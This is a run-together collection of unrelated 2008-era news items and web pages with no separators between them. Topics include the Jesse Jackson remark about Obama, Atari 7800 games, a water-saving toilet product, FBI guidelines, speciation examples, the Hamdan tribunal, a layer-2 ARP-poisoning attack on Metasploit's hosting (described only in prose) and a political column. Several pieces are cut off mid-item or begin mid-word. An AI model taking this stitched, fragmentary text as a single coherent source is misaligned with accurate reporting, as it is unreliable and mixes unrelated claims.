Update : Obama accepts Jackson apology Democratic presidential candidate Barack Obama shrugged off a crude comment aimed at him by the Rev. Jesse Jackson , accepting an apology for a remark Jackson made as he contended that Obama was n't speaking to issues important to the black community .
Unaware that his microphone was on during a break for a Fox News program last Sunday , Jackson used a slang reference to wanting to cut off Obama 's testicles .
When he learned Wednesday that the Fox News program " The O'Reilly Factor " would air his comments that night , Jackson apologized for " hurtful and wrong " remarks .
The Obama campaign took a measured response to the incident , releasing a brief statement Wednesday evening .
 As someone who grew up without a father in the home , Senator Obama has spoken and written for many years about the issue of parental responsibility , including the importance of fathers participating in their childrens lives .
He also discusses our responsibility as a society to provide jobs , justice , and opportunity for all .
He will continue to speak out about our responsibilities to ourselves and each other , and he of course accepts Reverend Jacksons apology , " campaign spokesman Bill Burton said .
Earlier in the day , Jackson released the following statement , according to CNN .
" For any harm or hurt that this hot mic private conversation may have caused , I apologize , " Jackson said in a statement issued to CNN .
" My support for Senator Obamas campaign is wide , deep and unequivocal .
I cherish this redemptive and historical moment . "
" My appeal was for the moral content of his message to not only deal with the personal and moral responsibility of black males , but to deal with the collective moral responsibility of government and the public policy which would be a corrective action for the lack of good choices that often led to their irresponsibility , " Jackson also said .
" That was the context of my private conversation and it does not reflect any disparagement on my part for the historic event in which we are involved or my pride in Senator Barack Obama , who is leading it , whom I have supported by crisscrossing this nation in every level of media and audience from the beginning in absolute terms . "
Jackson 's comments , but the comments were aired Wednesday night on Fox News '
The O'Reilly Factor , viewable below .
Jackson 's own son , Rep. Jesse Jackson , Jr. ( D - IL ) , had this to say according to ABC News : I 'm deeply outraged and disappointed in Reverend Jackson 's reckless statements about Senator Barack Obama .
His divisive and demeaning comments about the presumptive Democratic nominee -- and I believe the next president of the United States -- contradict his inspiring and courageous career .
Instead of tearing others down , Barack Obama wants to build the country up and bring people together so that we can move forward , together -- as one nation .
The remarks like those uttered on Fox by Revered Jackson do not advance the campaign 's cause of building a more perfect Union .
Revered Jackson is my dad and I 'll always love him .
He should know how hard that I 've worked for the last year and a half as a national co-chair of Barack Obama 's presidential campaign .
So , I thoroughly reject and repudiate his ugly rhetoric .
He should keep hope alive and any personal attacks and insults to himself .

Welcome to IGN Retro's new weekly countdown of the strange , silliest , and best moments in classic gaming : Top 10 .
But do n't let that " top " part lull you -- we 'll point out just as much infamy on these lists as we do the good stuff .
The Atari 7800 never had a chance .
Stacked against the dominant NES and a stubborn Master System , Atari 's competitor was doomed to fail .
The console was created in 1983 for full release the following year , but the faltering videogame market forced Atari to full it back .
The ascension of the NES proved that consoles were still quite viable ( if marketed correctly with good games ) , so Atari dusted off its shelved system .
By the time it was released in 1986 , the 7800 was saddled with tech a few years behind the curve .
The comparisons between the 7800's launch library -- which was also completed in 1984 -- and the games burning up the NES and SMS were dismal .
The system suffered little third - party support .
It was eventually binned in 1991 .
It can be argued , though , that the 7800 never exactly got a fair shake .
Atari actually listened to all complaints about the 5200 and address many with the 7800 , such as the return to digital joysticks and near - complete 2600 compatibility .
And the machine actually turned a profit since it was cheap to manufacture and sales were decent , thanks to consumers readily identifying the brand .
And while the overall 7800 catalog does not even belong in the stadium as the NES , there are still several charmers in there that were fun in 1986 and are still enjoyable today .
If you love to collect failed systems , the Atari 7800 belongs in your library .
And here are the top 10 Atari 7800 games you should pick up .
Lucky for you , most are cheap .
Most .
10 ) Crossbow Light gun games almost always deserve the benefit of the doubt -- there is just a visceral enjoyment about pointing the gun at the screen and picking off a target .
Now , the actual game itself can work overtime to undermine this sentiment .
And many do .
Crossbow for the 7800 is a port of a popular light gun game from the arcades that certainly suffers on the visual front , but the core is definitely intact .
Blasting through a series of medieval scenes with the 7800 's accurate light gun is a lot of fun .
9 ) Xevious Many home versions of Xevious failed due to wretched graphics , but the 7800 edition is one of the better out there .
It is a very accurate representation of Namco 's arcade hit .
Sure , it does n't visually mirror the still - cool arcade game , but it gets so much else right , such as the great audio and the slower setting that lets you get in some good practice .
The cropped screen also helps out with the arcade emulation experience .
A cheap , fun pick - up .
8 ) Commando
What matter in 7800 port of Capcom 's arcade blaster is not the graphics ( which are sub- standard ) , but the excellent pacing .
This is a gut - punch shooter that keeps you jamming on the fire button while fighting back against wave after wave of enemy soldiers .
It 's a great arcade port that , if joined by others , could have helped the 7800 carve out a biggest niche in the 8 - bit generation .
7 ) Asteroids Asteroids was an Atari console staple and the 7800 edition is the best of the bunch .
The two - player co-op mode is by far the best reason to pick up this edition , although the competitive mode is quite fun too .
This version does n't try to ape the vector graphics of the arcade game , but instead offers its own take with colorful space rocks and UFOs .
Asteroids is a standard by any measurement and this is a good version to pocket .
6 ) Winter Games
While the Atari 7800 edition of Winter Games is not as solid as the Commodore 64 version , this Epyx port is still highly enjoyable .
Across the four events , you engage is timing exercises such as the biathlon ( cross - country skiing and shooting ) , where you monitor your heart rate to maintain a steady pace .
Skating and ski jump are also good events .
If you have no access to the C64 version , the 7800 Winter Games is a good substitute .
5 ) Alien Brigade While Crossbow is certainly a fun light gun game , Alien Brigade trumps it with better graphics , good animation , and more weapons .
You must shoot through alien after alien while protecting civilians , and as you push deeper into the game , this gets to be pretty tricky .
As mentioned , the 7800 light gun is very accurate , so that certainly helps .
Alien Brigade is kinda rare , though , so expect to pay a little extra to secure it for your library .
4 ) Ikari Warriors
If you compare Ikari on the 7800 to the NES , there is no contest .
The NES version trumps it on production values .
But they are the same game , meaning the 7800 edition still plays well .
This is another fast - paced shooter from the eighties arcade scene that holds up well 20 years later .
3 ) Midnight Mutants
How can you not love a game that feature Grandpa from " The Munsters ? "
This Halloween - themed original action - adventure game for the 7800 hands over and axe , knife , and cross for doing battle with scores of monsters and several big bosses .
The world is big enough that Atari included a map , so there is some real longevity here as well as just solid exploration gameplay .
Did we mention it has Grandpa Munster ?
2 ) Ninja Golf Alright , so Ninja Golf is a better conversation piece than a game .
But how can you deny the concept ?
Or that box art ?

Introducing The AQUS Water Saving System
Flushing a toilet is one of those things that you ’ll probably do a couple times a day for the rest of your life .
Multiply that by the three other people in your house , and if you do the math , you ’ll know that it can add up to quite a bit of flushing !
As a matter of fact , our bathrooms account for roughly 74 % of total water usage , and to really put it in perspective , 40 % of all domestic water consumed is used to flush toilets .
Now that we ’ve established just how much water is being used each day in America to flush toilets , you ’ll know why the good people at WaterSaverTech.com have brilliantly constructed the ultimate way to go green in your home – the AQUS water saving system .
AQUS uses water from your bathroom sink to flush your toilet .
Just take a minute and think about how much your bathroom sink is used ( hand washing , shaving , brushing teeth , etc… ) .
All that water you ’re putting down the drain can be filtered and strategically moved to a reservoir that ’s used to flush your toilet – saving the average two person household around 10 - 20 gallons per day , or 5000 gallons a year .
Four person household – even better !
The AQUS is easy to install , it ’s hidden from view , tightly tucked inside the vanity below your sink , and works in conjunction with standard bathroom pipes .
Filters are in place to prevent hair and other particles from entering the resovoir , and purification tablets are also used to control bacteria .
So it ’s a neat and clean operation that will really make an impact on your water bill , and more importantly – the world .
Check out these statistics , reported by EPA ’s Office of Water :
According to the U.S. Environmental Protection Agency ’s Office of Water , more than 4.8 billion gallons of water is flushed down U.S. toilets each day .
The American Water Works Association estimates that if water–saving features were installed in every U.S. household , water use would decrease by 30 percent .
That would reduce daily water used by about 5.4 billion gallons , resulting in $ 113 million dollar–volume savings a day .
So if you ’re genuinely trying to make an impact on our world by saving energy and living more “ green ” , then this would be an affordable , money saving , and environmentally perfect way to go green today .
That ’s the cool thing about living greener – usually there are steps you can take this very instant to do your part .
The AQUS is no exception , and I highly recommend you head over to their site for more information .
Cheers to WaterSaverTech for selling such a brilliant device
Attorney General Michael Mukasey has agreed to postpone implementation of new FBI guidelines , after four Democratic senators raised concerns in a letter Wednesday about proposed changes that they say could permit the FBI to launch investigations of American citizens without any individualized basis for suspicion .
The letter , signed by Sens. Russ Feingold ( D - WI ) , Ted Kennedy ( D - MA ) , Dick Durbin ( D - IL ) , and Sheldon Whitehouse ( D - RI ) , concerned a draft of the Attorney General 's Guidelines governing criminal and intelligence inquiries by the Federal Bureau of Investigation .
The draft itself has not been made public , though The New York Times reports that the guidelines could be released next month .
The proposed rule change , first reported last week , would loosen restrictions on information sharing between agencies , and allow investigators to begin gathering information for criminal or intelligence purpose , even in the absence of any particularized evidence suggesting that a target is connected to criminal activity .
The senators fear that the new rules " might , for example , permit the FBI to conduct long - term physical surveillance of an innocent American citizen ; interview such an individual ’s neighbors and professional colleagues , including based on a ' pretext ' or misrepresentation ; recruit human sources to provide information on that individual ; or conduct commercial database searches on that individual — all without any basis for suspicion . "
In a speech earlier this month , Mukasey defended the change as a helpful clarification and harmonization of the rules that would better codify existing practices and eliminate " artificial distinctions " between criminal and intelligence inquiries .
But Michael German , a former FBI agent now at the American Civil Liberties Union , offered a more skeptical take , calling this characterization a tacit admission that the Bureau had already been ignoring its own guidelines .
Pointing to the case of Stephen Hatfill , whose reputation suffered after he was identified as a " person of interest " in the FBI 's investigation into the 2001 anthrax attacks , German said that " opening an investigation against someone has real consequences . "
While probable cause would still be required to conduct more intrusive searches , German noted that the resources of the FBI could permit it to gather large amounts of nominally " public " information about a target that would be unavailable to a normal private entity .
Calling increased reliance on data mining a symptom of " lazy law enforcement , " German said that the proposed guidelines are " one more example of the government 's failed policies that are n't getting any results , but are eating up a lot of resources and having an affect on innocent people who have n't done anything wrong — it 's like a trifecta . "
In a response to the senators ' concerns addressed to Senate Judiciary Committee Chairman Patrick Leahy ( D - VT ) , Mukasey agreed not to sign off on the new rules until after mid-September hearings at which FBI Director Robert Mueller will testify .
Mukasey set a target date of October 1 for making the guidelines effective .
A 31 - year - old Jerusalem woman was cruelly beaten and threatened with death by members of the ' modesty squad ' who took it upon themselves to interrogate her about her relationships with men , an indictment filed Thursday by the Jerusalem Prosecution reveals .
Opinion Wrong kind of modesty Uri Orbach Growing modesty requirements in religious world have nothing to do with religious law Wrong kind of modesty
According to the indictment , 29 - year - old Elhanan Buzaglo and six other men forced their way into the woman 's apartment in the Jerusalem neighborhood of Maalot Dafna several months ago .
The Prosecution says that the woman once belonged to the ultra-Orthodox community , but abandoned that life after her divorce in 2005 .
After seizing the woman , the men toppled her to the floor , kicked her repeatedly and then gagged her , warning she would be blinded with mace and stabbed if she dare open her eyes .
She was then ' interrogated ' by Buzaglo and his ilk , as they tried to force her to disclose the identities of men she had been in contact with .
The group , which also hurled profanities at the woman throughout the ordeal , is also accused of threatening to kill the woman if she did not move from her apartment .
The men are also charged with the theft of two cell phones ; it is believed the group took the phones with
the intent of obtaining the phone numbers of men the woman was seeing .
Based in the religious neighborhoods of Meah Shearim and Geula , the modesty squad has declared a crusade against violations of Halachic law and what it views as ' unchaste ' behavior .
According to the indictment , the group has elected to employ intimidation and violence as the means to this end .
According to the indictment , Buzaglo received $ 2,000 for part in the assault .
The State Prosecutor 's office , by way of Attorney Rivka Alkobi , is charging him with conspiracy to commit a crime , aggravated assault and two counts of extortion .

ere is a short list of referenced speciation events .
I picked four relatively well - known examples , from about a dozen that I had documented in materials that I have around my home .
These are all common knowledge , and by no means do they encompass all or most of the available examples .
Example one :
Two strains of Drosophila paulistorum developed hybrid sterility of male offspring between 1958 and 1963 .
Artificial selection induced strong intra-strain mating preferences .
( Test for speciation : sterile offspring and lack of interbreeding affinity . )
Dobzhansky , Th. , and O. Pavlovsky , 1971 .
" An experimentally created incipient species of Drosophila " , Nature 23:289-292 .
Example two :
Evidence that a species of fireweed formed by doubling of the chromosome count , from the original stock .
( Note that polyploids are generally considered to be a separate " race " of the same species as the original stock , but they do meet the criteria which you suggested . )
( Test for speciation : cannot produce offspring with the original stock . )
Mosquin , T. , 1967 .
" Evidence for autopolyploidy in Epilobium angustifolium ( Onaagraceae ) " , Evolution 21:713-719
Example three :
Rapid speciation of the Faeroe Island house mouse , which occurred in less than 250 years after man brought the creature to the island .
( Test for speciation in this case is based on morphology .
It is unlikely that forced breeding experiments have been performed with the parent stock . )
Stanley , S. , 1979 .
Macroevolution : Pattern and Process , San Francisco , W.H. Freeman and Company .
p. 41
Example four :
Formation of five new species of cichlid fishes which formed since they were isolated less than 4000 years ago from the parent stock , Lake Nagubago .
( Test for speciation in this case is by morphology and lack of natural interbreeding .
These fish have complex mating rituals and different coloration .
While it might be possible that different species are inter-fertile , they can not be convinced to mate . )
Mayr , E. , 1970 .

I have a friend who says since we have never seen a species actually split into two different species during recorded history that he has trouble believing in the theory of evolution .
Is this bogus and have humans seen animals bred into different species ?
( The various highly bred english dogs come to mind but I suppose this would be easier to find in vegetation .
Corn , wheat strains ?
Donkeys and mules ? )
" Three species of wildflowers called goatsbeards were introduced to the United States from Europe shortly after the turn of the century .
Within a few decades their populations expanded and began to encounter one another in the American West .
Whenever mixed populations occurred , the specied interbred ( hybridizing ) producing sterile hybrid offspring .
Suddenly , in the late forties two new species of goatsbeard appeared near Pullman , Washington .
Although the new species were similar in appearance to the hybrids , they produced fertile offspring .
The evolutionary process had created a separate species that could reproduce but not mate with the goatsbeard plants from which it had evolved . "
The article is on page 22 of the February , 1989 issue of Scientific American .
It 's called " A Breed Apart . "
It tells about studies conducted on a fruit fly , Rhagoletis pomonella , that is a parasite of the hawthorn tree and its fruit , which is commonly called the thorn apple .
About 150 years ago , some of these flies began infesting apple trees , as well .
The flies feed and breed on either apples or thorn apples , but not both .
There 's enough evidence to convince the scientific investigators that they 're witnessing speciation in action .
Note that some of the investigators set out to prove that speciation was not happening ; the evidence convinced them otherwise .

Abstract : J.A. Coyne wrongly asserted that neodarwinism includes allopatric evolution but not sympatric evolution .
Allopatric evolution occurs among geographically isolated populations , whereas sympatric evolution occurs within one species ' entire population .
Both are neodarwinian since each results from natural selection of genetic variation .
Also , Coyne failed to recognize that the molecular models used to illustrate how genetic changes bring on speciation are most useful when researchers acknowledge that both inherited epigenetic and genetic changes affect speciation .

There are two distinct strains of Rhagoletis pomonella , the apple maggot fly .
One infests the apple , the other the hawthorn .
They have different breeding times -- as the fruits flower at different times -- and so they do not interbreed in the real world .
I do not know if they could interbreed in the laboratory .
Since the fly is not found in Europe , and the apple is an import from Europe , the only presumption is that the apple strain is a speciation off the original hawthorn strain .

John Kerry announced a new website today designed to attack the smears against Barack Obama .
“ We ’ve seen this movie before .
The Republicans , without ideas , start running a negative campaign filled with personal attacks and misleading ads .
The attacks get condemned , but they get lots of attention and get played on TV endlessly , ” Kerry wrote in an email .
He wrote that it is n’t enough to play defense against smear campaigns , so this is why he launched Truth Fights Back , “ You ca n’t just play defense against smears , pointing out how they are n’t true .
You ’ve got to play offense , too , exposing the whole cynical game for what it is : an attempt to keep us from talking about the real issues and ultimately changing our country for the better . ”
Kerry pointed out that the Republicans have no issues to run on , “ The Republicans have nothing to run on , no ideas to push , no solutions for America .
They ’ll run a campaign of laughable gimmicks and outright distortions and lies .
But we can fight back with the truth – and the truth can win this time . ”
This is Kerry ’s own website funded by Kerry ’s leadership PAC .
He promises to stay on top of what the right wing is doing and fight for the truth .

The timing of the launch of this website is no coincidence .
The website will go after the “ 80 lies ” in Jerome Corsi ’s new book Obama Nation .
Corsi was one of the main players in the swift - boating of Kerry during the 2004 presidential campaign , but I do n’t think that his new book is going to damage Obama the same way as his 2004 attack did to Kerry .
This time the Democrats are ready for the attacks , and Barack Obama is more popular than John Kerry ever was in 2004 .
The vote in 2004 was more a vote against Bush than a vote for Kerry .
In 2008 , the election is about Barack Obama .
Those who support McCain are doing so as a vote against Obama .
The political mood of the nation is with the Democrats this time , so I doubt that this latest book will have any impact on the race .
I think this website is more about rallying the Democratic base , not concern over this upcoming smear campaign .
Well , this is just perfect .
At the exact moment Li Ning was rounding the lip of the Bird's Nest during the amazing torch - lighting climax , someone snapped this photo of our good friend the BSOD nestled among the Nest 's steel twigs .
Perhaps an Opening Ceremonies IT dude spit out his coffee on the machines in the server room when Li took to the sky ?
Another question is what a projection screen is doing inside the Nest at that location , but I think the better question is what was n't going on inside the Nest 's roof - did you see that thing during the ceremonies ?
Lights !
Fireworks !
LED screens !
Everything !
Anyway , if only one image of this perfectness existed we'd be skeptical , but thankfully , someone has grabbed more from a different angle that pretty much seal the deal .

$ 50,000 in sex toys may be missing from HPD property room Missing sex toys raise concerns at HPD property room
The Emperor is gone .
So is Cyber Wabbit .
Three years after Houston police seized these and hundreds of other sex toys worth $ 50,000 from the Adult Video Megaplexxx , the devices may be missing from the department 's property room .
The discovery came to light when a lawyer for the adult - entertainment shop sought to reclaim the 564 items that the 5th U.S. Circuit Court of Appeals recently declared legal to sell .
After initially telling attorney Richard Kuniansky the sex toys would be returned , Houston police then said they were destroyed .
" They said no problem , you can send somebody by to pick them up , and then we get another call and it 's ' Whoops , we do n't have them , ' " Kuniansky said .
Kuniansky said police told him they were destroyed , but he doubts that explanation .
" There is apparently no court order authorizing destruction of the property or any record of what happened to the property , " he said .
A check of Harris County court files did not turn up a destruction order in any of the cases involving the store 's employees .
A Chronicle request to interview a police supervisor who could discuss the toys ' whereabouts was not immediately answered .
" There does need to be a court order for the destruction of any property , " said Victor Senties , a police spokesman .
The last time the products were seen by Adult Video Megaplexxx employees was in 2005 , when they were carried away by vice officers .
They were to be locked in a property room as evidence .
The charges against employees were dropped .
And in February , a federal appeals court ruled that Texas ' 35 - year - old law banning the sale of sex toys was unconstitutional .
Kuniansky sought to resolve the matter in May by asking police in writing where his clients could retrieve the property .
A copy of a nine - page police inventory lists the sometimes comical , sometimes crude , names of the devices and prices .
The most expensive sold for $ 89.99 , the least was $ 11.99 .
The police property room , actually more of a warehouse given the massive number of cases it handles , has had its share of woes .
A police supervisor who was fired after roughly 30 guns went missing got his job back in June after telling a Houston Civil Service Commission that lapses in security allowed people with criminal records to get access to the property room .
Richard Segura , acting director of the Criminal Defense Clinic at the University of Texas School of Law , said Kuniansky has a right to ask for the devices back , but police should n't have to safeguard them forever .
" If I go over to your house and spend the night there and leave my shoes , can I expect my shoes to be there three years later ? " he said .
" What is the police department going to do with a bunch of ( sex toys ) ... keep them ? "
Still , he said whether the items were destroyed and under what authority would likely be set by department policy .
No matter how much time had passed , the department can't destroy property without following regulations , Kuniansky said .
Ray Hill , who has been a consultant for adult businesses , said sex toys were too tantalizing for police to destroy .
" I think the cops stole them , " he said .
" We 've got these gifts to give our girlfriends and friends , and as gags . "

Exquisite close - ups of fissures on a tiny frozen moon of Saturn will provide the latest clues in solving the riddle of how a 310 - mile - wide ice ball could possibly be shooting geysers of vapor and icy particles .
Since the discovery of the jets in 2005 , the moon , Enceladus , has jumped to near the top of the list of potential places for life in the solar system .
A warm spot near Enceladus ’s south pole powers the jets and may also melt below - surface ice into water , a necessity for living organisms .
On Monday , the NASA spacecraft Cassini made its latest flyby of Enceladus ( pronounced en- SELL - ah - dus ) , passing 30 miles above the moon ’s surface at 40,000 miles an hour .

Despite the high speed , Cassini was able to take razor - sharp images that , at seven meters per pixel , offer a resolution 10 times greater than earlier views .
Scientists can now clearly see the V - shaped walls of the fractures , which are nearly 1,000 feet deep .
Team members likened the accomplishment to taking a photo of a roadside billboard using a telephoto lens held out the window of a speeding car .
We were unprepared for the possibility that Christians did not focus on the death of Jesus for a thousand years .
As we visited ancient sites , consulted with art historians , and read ancient texts , we stepped back , astonished at the weight of the reality : Jesus ’s dead body was just not there .
We could not find it in the catacombs or Rome ’s early churches , in Istanbul ’s great sixth - century cathedral Hagia Sophia , in the monastery churches in northeastern Turkey , or in Ravenna ’s mosaics .
And as we realized that the Crucifixion was absent , we began to pay attention to what was present in early Christian art .
Paradise , we realized , was the dominant image of early Christian sanctuaries .
And to our surprise and delight , we discovered that early Christian paradise was something other than “ heaven ” or the afterlife .
In the early church , paradise — first and foremost — was this world , permeated and blessed by the Spirit of God.
Images of paradise in Rome and Ravenna captured the craggy , scruffy pastoral landscape , the orchards , the clear night skies , and teeming waters of the Mediterranean world , as if they were lit by a power from within .
Sparkling mosaics in vivid colors captured the world ’s luminosity .
The images filled the walls of spaces in which liturgies fostered aesthetic , emotional , spiritual , and intellectual experiences of life in the present , in a world created as good and delightful .
Nearly everything we had previously understood about Christian history , theology , and ritual began to shift as we delved deeper into the meaning of paradise .
Our new book , Saving Paradise : How Christianity Traded Love of This World for Crucifixion and Empire , reaches back nearly four thousand years to explore how the ancient people of West Asia imagined paradise .
It shows how the Bible ’s Hebrew prophets invoked the Garden of Eden to challenge the exploitation and carnage of empires .
It shows how Jesus ’s teachings and the practices of the early church affirmed life in this world as the place of salvation .
Within their church communities , Christians in the first millennium sought to help life flourish in the face of imperial power , violence , and death .
As the paradise of early Christianity entered our vision and seeped into our consciousness , Crucifixion - centered Christianity seemed increasingly strange to us .
We wondered what had happened to the understanding of this world as paradise .
When and why did Christianity shift to an obsession with atoning death and redemption through violence ?
What led Western Christianity to replace resurrection and life with a Crucifixion - centered salvation and to relegate paradise to a distant afterlife ?
In short , the needs of empire — and theologies that justified and then sanctified violence and war — transformed Christianity and alienated Western Christians from a world they had once perceived as paradise .
And yet a life - giving , life - affirming Christianity has survived despite many attempts to repress or destroy it and despite theological shifts that have betrayed it .
Paradise is not wholly lost .
As inheritors of Western Christianity , we believe we must stand again at the open doors of paradise and bless this world as sacred soil , as holy ground , and as a home that all must learn to inhabit together .
Paradise in the early church
As soon as congregants entered ancient churches , they stood in a three - tiered sacred cosmos .
A starry night sky or multihued clouds represented the first tier , the heavens , where celestial beings hovered ; from this mysterious realm , the right hand of God emerged to bless the world .
The second tier was an intermediary space over which the living Christ presided .
The departed saints stood with him in the meadows of paradise and visited to bless the living .
The third tier was the floor of the church where worshippers stood in God ’s garden on earth .
We saw this sacred cosmos in the mausoleum of Galla Placidia in Ravenna , Italy .
Built around 430 to commemorate St. Lawrence , the interior central dome displays a midnight blue sky that teems with gold stars .
A simple Latin cross marks the center apex of the sky , and the winged creatures of Ezekiel ’s heavenly vision — a lion , ox , eagle , and man—emerge from red and white clouds in the corners of the dome .
Below the celestial heavens , arches frame half - moon lunettes that depict paradise : spiraling grape and acanthus vines grow abundantly , bushes are laden with fruit , deer and doves drink at fountains and pools , and saints stand in green meadows .
In one lunette , Christ appears as a good shepherd , the last existing early image of him as a shepherd .
He sits on a pile of stones in a shrub - covered , rugged landscape .
His beardless , boyish face , framed by wavy shoulder - length hair , turns across his right shoulder toward a sheep that gazes at him on the rocky outcroppings .
With his left hand , he holds a shepherd ’s staff in the form of a cross - shaped labarum , and his right hand extends to touch the uplifted face of a sheep .
Ancient visitors to this shrine would have stood , as we did , one level below on the stone floor looking up at the canopy of the heavens , and around at the paradise that was home to Christ and the departed saints .
In this three - tiered universe , paradise had both a “ here ” and “ not here ” quality .
Christians taught that paradise had always been here on earth .
Sin had once closed its portals , but Jesus Christ had reopened them for the living .
While Christians could taste , see , and feel the traces of it in ordinary life , they arrived most fully in paradise in community worship .
With its art and buildings , the church created a space that united the living on earth with the heavenly beings and departed saints who surrounded and blessed the living .
The risen Christ and clouds of witnesses embraced this life and lifted it to touch the heavens at every Eucharist .
In that holy ritual , the community stood within the sacred cosmos , blessed by the fruits of the earth and the power of the saints .
Osama bin Laden ’s former driver can use testimony by alleged Sept. 11 mastermind Khalid Shaikh Mohammed and some other detained Al Qaeda operatives in his upcoming military trial at Guantanamo Bay because it might help exonerate him , a military judge said Monday .
Defense lawyers said at a hearing that they wanted to call Mohammed and seven other prospective witnesses in the case of Salim Ahmed Hamdan , the first detainee at the U.S. naval base in Cuba to be scheduled for trial .
If the proceedings begin next week as planned , it will be the first time the U.S. has held a military tribunal since World War II .
At a pretrial hearing for Hamdan at the naval base Monday , prosecutors said Mohammed and four other men accused of being his co-conspirators in the 2001 attacks on New York and Washington should not be allowed to testify because they might reveal some of the U.S. government ’s most closely held secrets , including sources of information about Al Qaeda and ways in which terrorism suspects are interrogated .
“ The detainees that they want access to hold in their heads some of the most serious national security and intelligence sources and methods that the United States has , ” Justice Department prosecutor Clayton Trivett said .

But Navy Capt. Keith J. Allred , the military judge hearing the case , said that Mohammed and the other men also appeared to have knowledge of events that could favor Hamdan , who has insisted for years that he was merely a driver for Bin Laden who needed the work and never engaged in , or knew about , terrorist activity .
Allred told the prosecutors in the Spartan courtroom that he saw the evidence brought forward by the defense lawyers as being “ relevant and necessary and exculpatory . ”
“ I just believe the defendant cannot have a fair trial without this evidence , ” Allred said .
Allred told both sides to work out some sort of compromise , which could include having the government submit written or videotaped testimony from Mohammed , Walid bin Attash , Ramzi Binalshibh , Mustafa Ahmed Hawsawi and Ali Abdul Aziz Ali .
A similar technique allowed Mohammed ’s testimony to be used in the federal criminal trial of Zacarias Moussaoui in 2003 .

Hamdan is charged with transporting weapons for Al Qaeda and helping Bin Laden escape after the Sept. 11 attacks .
He was captured in Afghanistan in late 2001 and charged by the military in 2004 .
His case has repeatedly been delayed and in 2006 led to a Supreme Court decision that forced the Bush administration to redo its military commissions system and get congressional approval for it .
Air Force Maj. Gail Crawford , a legal spokeswoman for the Office of Military Commissions , said the commissions had no immediate response to the judge ’s comments .
But , she said , “ it is very significant because it puts the prosecution on notice that the judge wants to hear this evidence and that they are going to have to find a way to get it in , and at the same time protect national security .
They are supposed to be meeting this week as soon as possible to come up with an alternative . ”
Frank Kendall , a lawyer who witnessed Monday ’s hearing as an observer for the advocacy group Human Rights First , said in a statement that the military was trying to block Mohammed and other so - called high - value detainees from testifying in order to protect the secrecy of torture allegedly conducted in secret overseas CIA prisons after Sept. 11 .
Advertisement
Today , the judge is expected to hear arguments on whether U.S. military interrogators coerced potentially incriminating statements out of Hamdan and subjected him to cruel and possibly illegal conditions of confinement .
The judge ’s comments Monday were the latest in a series of legal complications in the Hamdan case .
A judge in Washington , D.C. , is set to hear arguments this week on whether Hamdan has a right to take his case to federal court ; a ruling could effectively stop next week ’s military commission in its tracks .
On Monday , several hundred current and former European officials asked the judge in Washington to block Hamdan ’s military trial , saying it was “ clearly at odds with the most basic norms of fair trial and due process . ”
Justice Department spokesman Erik Ablin said , “ Our position is that the military commission proceedings are constitutional and . . . should go forward without interruption . ”

You ’ve no doubt heard that the site hosting Metasploit , the exploit framework , was hacked earlier this week , but what you may not have heard is that it was done using a layer 2 attack .
Though Metasploit.com was not actually cracked , a server on the same VLAN was compromised and used to ARP poison the gateway .
ARP poisoning is a method of sniffing data by sending a false ARP message to an Ethernet router to associate the hacker ’s MAC address with a valid IP address from a genuine network node .
From there the hackers were able to mount their MITM attack and show the image above instead of Metasploit ’s website .
This problem could have been avoided if the ISP was using fixed ARP entries , which is what [ HD Moore ] had to do to get the site back online .
[ Richard Bejtlich ] points out that even though most people have been focusing on application security lately , fundamental attacks like this still happen .
If you ’re doing a good job protecting yourself , you can still be at the mercy of the security of 3rd parties when operating in shared hosting environments .
As we head into the Fourth of July weekend of patriotic bluster and beer swilling — but before we are too besotted with ourselves — might we also for once consider our imperfections ?
Why not take a moment to heed the cautions of our founding father , George Washington , whose true legacy will most likely be ignored during the flag - waving weekend ?
Washington ’s “ Farewell Address ” to the new nation was a warning about the threat of American imperial ambitions and a declaration of his high expectations for a republic of free men :
“ In offering to you , my countrymen , these counsels of an old and affectionate friend , I dare not hope they will make the strong and lasting impression I could wish ; that they will control the usual current of the passions , or prevent our nation from running the course which has hitherto marked the destiny of nations .
But , if I may even flatter myself , that they may be productive of some partial benefit , some occasional good ; that they may now and then recur to moderate the fury of party spirit , to warn against the mischiefs of foreign intrigue , to guard against the impostures of pretended patriotism . … ”
We are drowning in the “ impostures of pretended patriotism , ” used to cover the lies that got us into Iraq , the defense of torture and the violation of our basic liberties .
In the name of patriotism , we presume a God - given American right to reorder the world to our liking , masking the vice of unfettered greed as an obligation of national security .
Any doubts as to this later governing impulse of our imperial ambitions were shattered with the recent news that U.S. advisers to our puppet government in the Green Zone of occupied Iraq have worked out agreements for American oil companies to gain control of Iraqi oil fields .
But , then again , what did we expect when we elected a Texas oil hustler , and a failed one at that , to be our president ?
Only in an America dumbed down by constant propaganda about our innate moral superiority will anyone any longer believe that we did n’t invade Iraq for the oil , even though Secretary of State Condoleezza Rice came to the Bush administration from the board of directors at Chevron , where they named an oil tanker after her .
Like Vice President Dick Cheney with those Halliburton contracts , Rice has stayed true to her corporate sponsors .
That ’s what the U.S. invasion of Iraq accomplished ; for the first time in more than three decades after Iraq joined a worldwide trend of formerly colonized nations gaining control of their own resources , Big Oil is getting its black gold back .
It was always about the oil — that ’s why “ we ” invaded Iraq — only “ we ” are n’t getting any , at least not at a reasonable price .
The oil companies are .
I know it ’s difficult for the corporate media and politicians , both fueled generously by energy money , to grasp the distinction , but we the people and they the oil companies are not one and the same .
While we suffer at the pump , they make record profits , which is the way they like it .
Do n’t think for a second that U.S. oil companies are rushing into Iraq to expand production to help lower world oil prices , thus making their investments less profitable .
They just want to be on the winning side , which is why the CEO of Halliburton relocated his office from Texas to the United Arab Emirates , where I am certain he and his fellow corporate expatriates are able to happily celebrate the Fourth of July .
So , take that American flag off your lapel and replace it with a button bearing the Exxon or Chevron logo .
C’mon , Dick Cheney and Condi Rice , be straight about what it is you are really pushing here .
‘ Fess up — it ’s not the good old USA as represented by the sucker taxpayers conned by your patriotic blather .
No sirree , what you would have Americans paying homage to is the majesty of the big multinational corporations that exploit American military power to rule the world .
But recognize that you have shamed the legacy of our first president .
George Washington , who distinguished the promise of the new world from the corruptions of the old by shunning imperial conquest , said : “ Our commercial policy should hold an equal and impartial hand ; neither seeking nor granting exclusive favors or preferences ; consulting the natural course of things ; diffusing and diversifying by gentle means the streams of commerce , but forcing nothing . ”
If Barack Obama or John McCain was to offer such words of wisdom this Fourth of July , he would be vilified as “ weak , ” and that is a fit measure of just how far we have descended from the high hopes of our first president .
Robert Scheer is the author , most recently , of “ The Pornography of Power : How Defense Hawks Hijacked 9/11 and Weakened America , ” published by Twelve Books .
Top McCain adviser lobbied for Republic of Georgia Andrew McLemore
Published : Sunday August 10 , 2008
